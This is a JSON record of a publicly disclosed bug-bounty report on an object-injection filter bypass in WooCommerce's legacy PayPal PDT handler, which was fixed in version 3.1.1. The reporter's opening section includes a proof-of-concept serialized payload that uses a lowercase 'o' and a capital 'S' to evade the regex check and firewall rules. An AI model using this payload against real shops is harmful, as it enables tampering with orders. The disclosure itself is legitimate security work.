{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-08-16T12:53:50.942Z", 
    "voters": [
        "marcs0h", 
        "eveeez", 
        "luckydivino", 
        "mr_r3boot", 
        "apapedulimu", 
        "japz", 
        "cuso4"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "300.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 245228, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-09-11T13:48:49.700Z", 
    "vulnerability_information": "At this moment prevention from object injection is in the following line of code: \n```\npreg_match( '/^a:2:{/', $raw_custom ) && ! preg_match( '/[CO]:\\+?[0-9]+:\"/', $raw_custom ) && ( $custom = maybe_unserialize( $raw_custom ) )\n```\nbut the PHP native [unserialize](https://github.com/php/php-src/blob/master/ext/standard/var_unserializer.c) function supports little `o` as option in it and it is a StdClass object. \n\nDue this protection, we have a bypass (PoC below) e.g. due the fact how woocommerce gets the order we can set any order object we want. As an extra, if combined with capital `S` then for some attacks even known firewall rules will fail/will be bypassed.\n```\n$attack_str = 'a:2:{i:1;s:3:\"key\";i:0;o:3:\"s:2:\"ID\";o:1:\"s:0:\"\";o:1:\"s:2:\"ID\";S:1:\"1\";}}s:9:\"order_key\";s:3:\"key\";s:9:\"post_type\";s:2:\"ok\";}}';\n\nif (preg_match( '/^a:2:{/', $attack_str ) && ! preg_match( '/[CO]:\\+?[0-9]+:\"/', $attack_str )){\n\tvar_dump(unserialize($attack_str));\n}\n```\n", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "medium", 
        "author_type": "User"
    }, 
    "title": "Object Injection in Woocommerce / Handle PDT Responses from PayPal", 
    "is_member_of_team?": null, 
    "vote_count": 7, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-09-15T12:53:50.990Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$300", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-07-02T01:38:24.389Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-02T01:38:24.389Z", 
            "actor": {
                "username": "b258ea62bf297b02afa9854", 
                "url": "/b258ea62bf297b02afa9854", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Same applies towards `json` handle e.g. check for `is_object( $custom )` are not enough, but instead we need to be sure that \n```\n$order_id  = $custom->order_id;\n$order_key = $custom->order_key;\n```\nare not objects, specially `$order_id  = $custom->order_id;`.", 
            "markdown_message": "<p>Same applies towards <code>json</code> handle e.g. check for <code>is_object( $custom )</code> are not enough, but instead we need to be sure that </p>\n<pre class=\"highlight plaintext\"><code>$order_id  = $custom-&gt;order_id;\n$order_key = $custom-&gt;order_key;\n</code></pre>\n<p>are not objects, specially <code>$order_id  = $custom-&gt;order_id;</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1797161, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-02T13:50:26.658Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-02T13:50:26.658Z", 
            "actor": {
                "username": "b258ea62bf297b02afa9854", 
                "url": "/b258ea62bf297b02afa9854", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Regarding possible attacks towards PHP version on the server via `unserialize` [PoC code on 3v4l](https://3v4l.org/qRdGZ#output)", 
            "markdown_message": "<p>Regarding possible attacks towards PHP version on the server via <code>unserialize</code> <a href=\"/redirect?signature=7ace9f637746a65f806b81df0d389782961a51c4&amp;url=https%3A%2F%2F3v4l.org%2FqRdGZ%23output\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>PoC code on 3v4l</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 1797673, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-03T15:01:42.287Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-03T15:01:42.287Z", 
            "actor": {
                "username": "xknown", 
                "url": "/xknown", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Hi. Thanks for the report. We are going to take a look.", 
            "markdown_message": "<p>Hi. Thanks for the report. We are going to take a look.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1799500, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-31T00:31:21.426Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-31T00:31:21.426Z", 
            "actor": {
                "username": "b258ea62bf297b02afa9854", 
                "url": "/b258ea62bf297b02afa9854", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "What is the status of this one? ", 
            "markdown_message": "<p>What is the status of this one? </p>\n", 
            "type": "Activities::Comment", 
            "id": 1878570, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "b258ea62bf297b02afa9854", 
                "url": "/b258ea62bf297b02afa9854"
            }, 
            "created_at": "2017-08-04T13:55:22.822Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-04T13:55:22.822Z", 
            "actor": {
                "username": "xknown", 
                "url": "/xknown", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Hi. The WooCommerce 3.1.1 release fixed this issue (we removed the legacy paypal code). Thanks again for the report.", 
            "markdown_message": "<p>Hi. The WooCommerce 3.1.1 release fixed this issue (we removed the legacy paypal code). Thanks again for the report.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1892982, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-08-04T14:01:10.943Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-04T14:01:10.943Z", 
            "actor": {
                "url": "/automattic", 
                "profile": {
                    "name": "Automattic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
                }
            }, 
            "team_handle": "automattic", 
            "bonus_amount": "0.0", 
            "bounty_amount": "300.0", 
            "collaborator": {
                "username": "b258ea62bf297b02afa9854", 
                "url": "/b258ea62bf297b02afa9854"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1892991, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-16T12:53:50.957Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-16T12:53:50.957Z", 
            "actor": {
                "username": "b258ea62bf297b02afa9854", 
                "url": "/b258ea62bf297b02afa9854", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "first_to_agree": true, 
            "message": "Hi, just before end of August I plan to release a public advisory for this issue due the fact update is pushed and issue is resolved.", 
            "markdown_message": "<p>Hi, just before end of August I plan to release a public advisory for this issue due the fact update is pushed and issue is resolved.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1933302, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-11T13:48:49.715Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-11T13:48:49.715Z", 
            "actor": {
                "username": "xknown", 
                "url": "/xknown", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1989088, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-11T13:48:49.764Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-11T13:48:49.764Z", 
            "actor": {
                "username": "xknown", 
                "url": "/xknown", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1989089, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "b258ea62bf297b02afa9854", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": true, 
        "url": "/b258ea62bf297b02afa9854", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -38655541.95136173, 
    "disclosed_at": "2017-09-11T13:48:49.750Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/245228", 
    "created_at": "2017-07-02T01:13:06.370Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>At this moment prevention from object injection is in the following line of code: </p>\n<pre class=\"highlight plaintext\"><code>preg_match( &#39;/^a:2:{/&#39;, $raw_custom ) &amp;&amp; ! preg_match( &#39;/[CO]:\\+?[0-9]+:&quot;/&#39;, $raw_custom ) &amp;&amp; ( $custom = maybe_unserialize( $raw_custom ) )\n</code></pre>\n<p>but the PHP native <a href=\"/redirect?signature=d4b24cac67f2d80500746d2b61b4b8c23d2176d1&amp;url=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fblob%2Fmaster%2Fext%2Fstandard%2Fvar_unserializer.c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>unserialize</span><i class=\"icon-external-link\"></i></a> function supports little <code>o</code> as option in it and it is a StdClass object. </p>\n\n<p>Due this protection, we have a bypass (PoC below) e.g. due the fact how woocommerce gets the order we can set any order object we want. As an extra, if combined with capital <code>S</code> then for some attacks even known firewall rules will fail/will be bypassed.</p>\n<pre class=\"highlight plaintext\"><code>$attack_str = &#39;a:2:{i:1;s:3:&quot;key&quot;;i:0;o:3:&quot;s:2:&quot;ID&quot;;o:1:&quot;s:0:&quot;&quot;;o:1:&quot;s:2:&quot;ID&quot;;S:1:&quot;1&quot;;}}s:9:&quot;order_key&quot;;s:3:&quot;key&quot;;s:9:&quot;post_type&quot;;s:2:&quot;ok&quot;;}}&#39;;\n\nif (preg_match( &#39;/^a:2:{/&#39;, $attack_str ) &amp;&amp; ! preg_match( &#39;/[CO]:\\+?[0-9]+:&quot;/&#39;, $attack_str )){\n    var_dump(unserialize($attack_str));\n}\n</code></pre>", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://automattic.com", 
            "about": "WordPress.com, VaultPress, Akismet, Gravatar, Cloudup, WooCommerce, Polldaddy and more!", 
            "twitter_handle": "", 
            "name": "Automattic"
        }, 
        "handle": "automattic", 
        "url": "https://hackerone.com/automattic", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/111/6b5147b71079b286c99869a85682f609f6c617c6_small.png?1396031864", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 111, 
        "default_currency": "usd"
    }, 
    "is_published": false
}